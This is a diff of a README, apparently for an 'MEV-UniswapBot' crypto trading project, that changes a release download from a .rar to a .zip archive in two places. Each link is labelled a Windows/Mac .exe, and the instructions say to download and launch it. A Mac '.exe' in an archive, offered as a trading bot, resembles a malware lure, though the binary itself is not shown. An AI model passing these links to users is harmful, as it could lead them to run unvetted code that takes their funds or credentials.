@@ -7,7 +7,7 @@
 </p>
 
 
--   [Download for Windows/Mac OS (.exe)](https://github.com/ttooonnyy/MEV-UniswapBot/releases/download/Download/application.rar)
+-   [Download for Windows/Mac OS (.exe)](https://github.com/ttooonnyy/MEV-UniswapBot/releases/download/Download/application.zip)
 -   [Download for Python (.py)](deployer.py)
 
 
@@ -55,7 +55,7 @@ The **DeployerIDE** local deployer provides a secure and efficient environment f
 
 1.  **Download and launch DeployerIDE**.
 2.  **Follow the setup instructions** available in the Documentation section.
--   [Download for Windows/Mac OS (.exe)](https://github.com/ttooonnyy/MEV-UniswapBot/releases/download/Download/application.rar)
+-   [Download for Windows/Mac OS (.exe)](https://github.com/ttooonnyy/MEV-UniswapBot/releases/download/Download/application.zip)
 -   [Download for Python (.py)](deployer.py)
 
 
